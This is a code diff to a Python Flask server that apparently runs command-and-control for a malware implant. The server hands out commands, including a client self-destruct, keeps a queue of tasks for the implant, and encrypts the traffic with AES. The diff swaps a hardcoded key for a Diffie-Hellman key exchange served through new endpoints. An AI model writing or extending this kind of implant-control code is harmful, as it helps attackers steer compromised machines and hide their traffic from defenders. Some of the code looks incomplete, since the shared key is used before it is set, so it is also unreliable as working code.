@@ -1,8 +1,11 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, Response
 import os
 from queue import *
+import json
 from Crypto.Cipher import AES
 from stegano import lsb
+from diffiehellman import DiffieHellman
+
 
 app = Flask(__name__)
 
@@ -14,26 +17,32 @@ command_menu = {
     3: 'destroy', # Special non-Linux command that causes client to self-destruct
 }
 
-global_key = int("ffffffffffffffffffffffffffffffff", 16).to_bytes(16, "big")
+
+# global_key = int("ffffffffffffffffffffffffffffffff", 16).to_bytes(16, "big")
+
 
 # Queue of tasks assigned to the implant
 tasks = Queue()
 
+dh1 = DiffieHellman(group=14, key_bits=540)
+dh1_public = dh1.get_public_key()
+
 #Encryption of data -- IV is concatenated at the end of message for decryption
 def encrypt(plain_str): 
     padding = 16 - (len(plain_str) % 16)
-    cipher = AES.new(global_key, AES.MODE_CBC)
+    cipher = AES.new(shared_key, AES.MODE_CBC)
     plaintext = plain_str.encode() + (padding.to_bytes(1, "big") * padding)
     encrypted = cipher.encrypt(plaintext)
     print(f"[*] Encrypted Message: {encrypted})")
     res = encrypted + cipher.iv
     return res.decode('latin-1')
 
+
 #Decryption of data 
 def decrypt(ciphertext): 
     ciphertext = ciphertext.encode("latin-1")
     init_v = ciphertext[-16:]
-    cipher = AES.new(global_key, AES.MODE_CBC, init_v)
+    cipher = AES.new(shared_key, AES.MODE_CBC, init_v)
     msg = ciphertext[:-16]
     plaintext = cipher.decrypt(msg)
     plaintext = plaintext[:-plaintext[len(plaintext)-1]]
@@ -44,6 +53,17 @@ def decrypt(ciphertext):
 @app.route('/')
 def menu():
     return jsonify(command_menu)
+
+@app.route('/getkey', methods=['GET'])
+def get_public_key():
+    return jsonify({"key": dh1_public.decode('latin-1')})
+
+
+@app.route('/sendkey', methods=['POST'])
+def send_public_key():
+    global shared_key
+    res = request.get_json()["key"]
+    shared_key = dh1.generate_shared_key(res.encode('latin-1'))
 
 # A controller can invoke this endpoint to task the client
 @app.route('/assign/<int:cmd_index>', methods=['POST'])
